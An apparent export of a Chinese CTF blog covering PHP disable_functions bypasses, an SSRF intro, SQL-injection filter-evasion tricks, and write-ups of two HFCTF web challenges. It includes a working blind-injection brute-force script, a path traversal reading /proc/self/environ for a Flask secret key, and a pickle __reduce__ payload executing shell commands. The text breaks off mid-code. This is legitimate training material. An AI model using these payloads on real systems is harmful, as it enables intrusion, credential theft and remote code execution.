class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61813</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.strlen(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= implode(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br>fputs(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=fread(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = substr(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br><br></code></pre></div></td></tr></table></figure><h4 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行"></a>PHP-FPM任意代码执行</h4><p>参考文章<br><a href="_url"></a><a href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a><br><a href="_url"></a><a href="https://juejin.cn/post/6844903471976546311">https://juejin.cn/post/6844903471976546311</a><br><a href="_url"></a><a href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a><br><a href="_url"></a><a href="https://www.cnblogs.com/cjjjj/p/9844829.html">https://www.cnblogs.com/cjjjj/p/9844829.html</a><br><a href="_url"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><h2 id="UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等-1"><a href="#UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等-1" class="headerlink" title="- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等"></a>- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等</h2><p>这个地方漏洞原理与堆溢出有关，着实没看懂，直接用github现成的代码或者蚁剑绕过吧</p><p><a href="_url"></a><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p>可参考文章<br><a href="_url"></a><a href="https://www.anquanke.com/post/id/195686#h3-6">https://www.anquanke.com/post/id/195686#h3-6</a><br><a href="_url"></a><a href="https://www.sohu.com/a/440546290_99907709">https://www.sohu.com/a/440546290_99907709</a></p>]]></content>
    
    
    <categories>
      
      <category>关于disabled_function的绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h3><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。</p>]]></content>
    
    
    <categories>
      
      <category>ctfhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctfhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFhatenum</title>
    <link href="/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/"/>
    <url>/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/</url>
    
    <content type="html"><![CDATA[<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><h4 id="总结一下sql注入常见的绕过姿势"><a href="#总结一下sql注入常见的绕过姿势" class="headerlink" title="- 总结一下sql注入常见的绕过姿势"></a>- 总结一下sql注入常见的绕过姿势</h4><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="- 题目分析"></a>- 题目分析</h4><h4 id="编写exp"><a href="#编写exp" class="headerlink" title="- 编写exp"></a>- 编写exp</h4><hr><h3 id="关于sql注入的绕过姿势"><a href="#关于sql注入的绕过姿势" class="headerlink" title="关于sql注入的绕过姿势"></a>关于sql注入的绕过姿势</h3><h5 id="对于空格的绕过"><a href="#对于空格的绕过" class="headerlink" title="对于空格的绕过"></a>对于空格的绕过</h5><ul><li>换成 /**/ /<em>!</em>/</li><li>用编码绕过</li><li>加括号绕过</li></ul><h4 id="对于引号的绕过"><a href="#对于引号的绕过" class="headerlink" title="对于引号的绕过"></a>对于引号的绕过</h4><ul><li>用十六进制绕过<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></div></td></tr></table></figure>十六进制替换后<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></div></td></tr></table></figure></li></ul><h4 id="对于逗号的绕过"><a href="#对于逗号的绕过" class="headerlink" title="对于逗号的绕过"></a>对于逗号的绕过</h4><ul><li>可以用from或者offset来绕过</li></ul><h4 id="比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本"><a href="#比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本" class="headerlink" title="比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本"></a>比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</h4><ul><li>可以使用greatest()、least（）（前者返回最大值，后者返回最小值）</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><p>替换后为下面语句</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><h4 id="号的绕过"><a href="#号的绕过" class="headerlink" title="=号的绕过"></a>=号的绕过</h4><ul><li>可以用regexp，like等来替换</li></ul><h4 id="内联注释绕过："><a href="#内联注释绕过：" class="headerlink" title="内联注释绕过："></a>内联注释绕过：</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></div></td></tr></table></figure><h4 id="通用绕过（编码）"><a href="#通用绕过（编码）" class="headerlink" title="通用绕过（编码）"></a>通用绕过（编码）</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br></code></pre></div></td></tr></table></figure><hr><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="- 题目分析"></a>- 题目分析</h4><p>拿到源码审计后可以发现几乎将所有的可用的注入方法都过滤掉了，然而笨比我还企图绕过各种过滤进行insert的报错注入,也试过异或注入，但是各种注入都需要同时绕过一些标点符号，始终构造不出来，最终发现常规的注入不太现实。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到源码可以发现最重要的地方在于得到admin用户名的code，所以这个地方应该可以通过注入获得code的值，然后得到flag<br><img src="https://img-blog.csdnimg.cn/20210506120247504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后来问了一下大佬才发现可以用exp(710)的溢出报错简单来说指数函数为对数函数的反函数，exp()即为以e为底的对数函数，但当传递一个大于709的值时，函数exp()就会引起一个溢出错误。并且还会用到rlike,rlike后面是正则语句，返回0或1，则可以构造 ==||exp(710-(… rlike … ))== 。 下图是在本地复现，rlike可以匹配age中含有1的,返回1则为exp(709)不报错。<br><img src="https://img-blog.csdnimg.cn/20210506164455116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506163137166.png" alt="在这里插入图片描述"><br>当匹配不到返回0则exp(710)报错<br><img src="https://img-blog.csdnimg.cn/20210506164538650.png" alt="在这里插入图片描述"></p><p>到这里题目思路就出来了</p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py">&gt; - <span class="hljs-string">&#x27;username&#x27;</span> : <span class="hljs-string">&quot;admin\\&quot;</span>    转义单引号造成错误闭合<br>&gt; - <span class="hljs-string">&#x27;password&#x27;</span> : <span class="hljs-string">&quot;||exp(710-(code rlike binary ....))#&quot;</span> 其中空格用编码绕过（<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>)，引号用十六进制绕过<br>&gt; - <span class="hljs-string">&quot;code&quot;</span> : <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>题目限制了只有四个十六进制的数大小，则不能一个个爆破，但思路已经出来了，剩下就是写脚本了.<br>但是还有一个值得注意的问题就是因为rlike是对所有的进行匹配不是从开头，所以匹配过程中可能会出现多解，这个后面会说到</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">num_waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,<span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Huge num detected&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer_to_hex</span>(<span class="hljs-params">num</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> num])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    part = <span class="hljs-string">&#x27;erg&#x27;</span><br>    result = <span class="hljs-string">&#x27;erg&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    temp = <span class="hljs-string">&#x27;&#x27;</span><br>    alphabet = string.digits + string.ascii_letters<br>    url = <span class="hljs-string">&#x27;http://4e2056fd-b5b8-4e3c-b3df-86d99baa43c9.node3.buuoj.cn&#x27;</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        temp = transfer_to_hex(part)<br>        count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>            s = transfer_to_hex(j)<br>            payload = <span class="hljs-string">&quot;||exp(710-(code rlike binary 0x&quot;</span> + temp + s + <span class="hljs-string">&quot;))#&quot;</span><br>            payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0c</span>))<br>            <span class="hljs-comment"># print(payload)</span><br>            data = &#123;<br>                <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin\\&quot;</span>,<br>                <span class="hljs-string">&quot;password&quot;</span>: payload,<br>                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>            &#125;<br>            res = requests.post(url + <span class="hljs-string">&quot;/login.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-comment"># print(req.text)</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;fail&#x27;</span> <span class="hljs-keyword">in</span> res.text):<br>                count = count + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: &quot;</span> + result )<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: &quot;</span> + result[:-<span class="hljs-number">1</span>] + j)<br>                <span class="hljs-keyword">else</span>:<br>                    part = part[<span class="hljs-number">1</span>:] + j<br>                    result = result + j<br>                    <span class="hljs-built_in">print</span>(result)<br>                    <span class="hljs-comment"># print(part)</span><br>exp()<br><span class="hljs-comment"># ||exp(710-(code rlike binary 0x65726730))#</span><br><span class="hljs-comment"># ||exp(710-(code|rlike|binary|0x65))#</span><br></code></pre></div></td></tr></table></figure><p>这个地方要先跑出前几个字符<br><img src="https://img-blog.csdnimg.cn/20210506175331227.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506175347610.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021050617540682.png" alt="在这里插入图片描述"><br>然后用前三个第四个，第四个推第五个以此类推，但这里确实出现了多解，交换数字字母表的顺序会跑出来两种结果<br><img src="https://img-blog.csdnimg.cn/20210506181237183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210506181714835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细观察一下第一种结果后面形成了一种死循环则gh2u应该在gh23前面，则可以推测出code最终为</p><ul><li>erghruigh2uygh23uiu32ig<br>最后用admin\账号登录 密码用||1# 验证码用erghruigh2uygh23uiu32ig即可获得flag<br><img src="https://img-blog.csdnimg.cn/20210506183812271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><ul><li>总结一下：注入真的博大精深，多积累这些方法吧</li></ul>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUU</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFeasyflask</title>
    <link href="/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/"/>
    <url>/2021/05/04/2021-5-4-%5BHFCTF%5Dezsyflask/</url>
    
    <content type="html"><![CDATA[<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><h4 id="按提示找到源码"><a href="#按提示找到源码" class="headerlink" title="- 按提示找到源码"></a>- 按提示找到源码</h4><h4 id="找到secret-key"><a href="#找到secret-key" class="headerlink" title="- 找到secret key"></a>- 找到secret key</h4><h4 id="构造反序列化伪造cookie"><a href="#构造反序列化伪造cookie" class="headerlink" title="- 构造反序列化伪造cookie"></a>- 构造反序列化伪造cookie</h4><hr><h2 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h2><p>这个按题目提示构造/file?file=/app/source即可得到源码</p><h2 id="找secret-key"><a href="#找secret-key" class="headerlink" title="找secret key"></a>找secret key</h2><p>审计源码到这发现有一个黑名单过滤，并且有一个路径拼接，看到这里显然可以想到读取任意文件，百度了一下os.path.jpin()函数发现有漏洞</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">os.path.<span class="hljs-keyword">join</span>()函数用于路径拼接文件路径。<br>os.path.<span class="hljs-keyword">join</span>()函数中可以传入多个路径：<br><br>会从第一个以”/”开头的参数开始拼接，之前的参数全部丢弃。<br><br>以上一种情况为先。在上一种情况确保情况下，若出现”.<span class="hljs-regexp">/”开头的参数，会从”./</span>”开头的参数的上一个参数开始拼接。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504125249732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后直接输路径就行最开始我读的是/etc/passwd,/etc/profile，后来发现都没啥作用，最后才发现还有一个程序的环境变量/proc文件夹，对于/proc文件的解释如下</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">/<span class="hljs-meta">proc</span>文件系统下的多种文件提供的系统信息不是针对某个特定进程的，而是能够在整个系统范围的上下文中使用。可以使用的文件随系统<br>配置的变化而变化。命令procinfo能够显示基于其中某些文件的多种系统信息。以下详细描述/<span class="hljs-meta">proc</span>下的文件。 <br><br>/<span class="hljs-meta">proc</span>文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和<br>应用程序可以通过 <span class="hljs-meta">proc</span>得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取pr<br><span class="hljs-symbol">oc</span>文件时，<span class="hljs-meta">proc</span>文件系统是 动态从系统内核读出所需信息并提交的。<br></code></pre></div></td></tr></table></figure><p>最后读/proc/self/environ可得到secret key<br><img src="https://img-blog.csdnimg.cn/20210504130045223.png" alt="在这里插入图片描述"></p><h2 id="构造反序列化伪造cookie-1"><a href="#构造反序列化伪造cookie-1" class="headerlink" title="构造反序列化伪造cookie"></a>构造反序列化伪造cookie</h2><p>直接将代码复制下来改一下user类本地跑一下session</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span><br><br><span class="hljs-comment"># User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="hljs-comment">#     &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="hljs-comment">#     &#x27;is_admin&#x27;: 1,</span><br><span class="hljs-comment">#     &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="hljs-comment">#     &#x27;__reduce__&#x27;: (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,)),</span><br><span class="hljs-comment"># &#125;)</span><br><span class="hljs-comment"># def __reduce__(self):</span><br><span class="hljs-comment">#     # os.system(&#x27;ls &gt; /1.txt&#x27;)</span><br><span class="hljs-comment">#     # 